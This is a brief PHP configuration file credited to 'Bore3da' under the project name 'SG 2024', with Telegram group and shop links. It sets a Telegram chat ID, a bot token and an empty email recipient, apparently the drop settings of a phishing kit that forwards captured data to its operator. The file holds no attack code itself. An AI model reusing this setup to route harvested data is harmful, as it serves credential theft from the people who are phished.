<?php
/**

 * Group Chat   :   https://t.me/bore3da_chat 
 * @telegram   :   @Bore3da 
 * Project Name:   SG 2024
 * Author      :   Bore3da

 * channel Telegram  :  https://t.me/bore3dashop
 */

// telegram

$chat_id = "-52219";
$bot_token = "63438dwEN_6CAFH2wo";
// email
$to = '';


?>